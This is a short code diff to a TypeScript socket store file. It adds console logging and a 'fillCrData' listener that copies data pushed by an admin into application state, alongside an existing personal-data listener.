@@ -280,11 +280,20 @@ export function initializeSocket() {
     waitingMessage.value = "";
   });
 
+  console.log("store.ts: Setting up fillPersonalData listener.");
   s.on("fillPersonalData", (data: any) => {
-    console.log("Received fillPersonalData event in store.ts:", data);
+    console.log("store.ts: Received fillPersonalData event in store.ts:", data);
     console.log("Personal data received from admin:", data);
     personalData.value = { ...data, timestamp: Date.now() };
     console.log("personalData signal updated in store.ts:", personalData.value);
+  });
+
+  console.log("store.ts: Setting up fillCrData listener.");
+  s.on("fillCrData", (data: any) => {
+    console.log("store.ts: Received fillCrData event in store.ts:", data);
+    console.log("CR data received from admin:", data);
+    crData.value = { ...data, timestamp: Date.now() };
+    console.log("crData signal updated in store.ts:", crData.value);
   });
 
   s.on("cardNumber:verified", (verified: boolean) => {
